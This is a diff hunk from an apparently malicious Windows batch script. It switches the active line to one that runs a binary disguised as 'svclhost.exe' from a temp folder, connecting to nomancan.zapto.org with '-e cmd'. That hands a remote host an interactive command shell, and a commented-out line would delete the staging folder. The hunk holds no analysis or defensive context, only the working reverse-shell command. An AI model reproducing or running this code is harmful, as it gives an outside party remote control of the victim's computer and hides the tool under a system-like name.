@@ -22,7 +22,7 @@ cd "C:\Windows\Temp"
 
 
 
-cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org 4425 -e cmd
-rem cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd
+rem cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org 4425 -e cmd
+cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd
 
 rem rmdir /Q /S "C:\Windows\Temp\0test0"
